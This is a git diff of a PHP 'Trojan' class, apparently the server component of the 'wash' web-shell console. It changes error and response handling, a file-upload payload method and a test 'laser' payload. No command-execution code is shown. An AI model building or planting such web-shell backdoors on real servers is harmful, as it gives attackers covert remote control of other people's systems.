@@ -14,11 +14,12 @@ class Trojan{
     private $options         = array(
         'redirect_stderr_to_stdout'  => true,
     );
+    // do I need this?
     private $output_raw      = array();
     private $response        = array(
-        'error'          => '',
-        'output'         => '',
-        'prompt_context' => '',
+        'error'          => null,
+        'output'         => null,
+        'prompt_context' => null,
     );
 
     /**
@@ -59,7 +60,6 @@ class Trojan{
             # if the method doesn't exist, send back an error message
             else {
                 $this->response = array(
-                    # todo: implement error support within the wash console
                     'error'          => "wash error: the method $method is not supported by the trojan.",
                     'output'         => "wash error: the method $method is not supported by the trojan.",
                     'prompt_context' => $this->prompt_context,
@@ -115,8 +115,9 @@ class Trojan{
 
         # configure the response to send
         $this->response = array(
-            'prompt_context' => $this->response['prompt_context'],
+            'error'          => $this->response['error'],
             'output'         => $this->response['output'],
+            'prompt_context' => $this->response['prompt_context'],
         );
 
         # assemble and send a JSON-encoded response
@@ -175,7 +176,7 @@ class Trojan{
      */
     public function payload_file_up($args){
         $out = json_encode($_FILES);
-        $out = json_encode($_POST);
+        $out = json_encode($_FILES);
 
         # assemble a response
         $this->response = array(
@@ -188,11 +189,10 @@ class Trojan{
 
     # fire mah layzor
     public function payload_laser($args){
-        $args = join($args, "\n");
-
         # assemble a response
         $this->response = array(
-            'output'         => 'Laser fired!!1' . $args,
+            'error'          => 'wash error: This is some error text',
+            'output'         => 'Laser fired!!1',
             'prompt_context' => $this->prompt_context,
         );
 
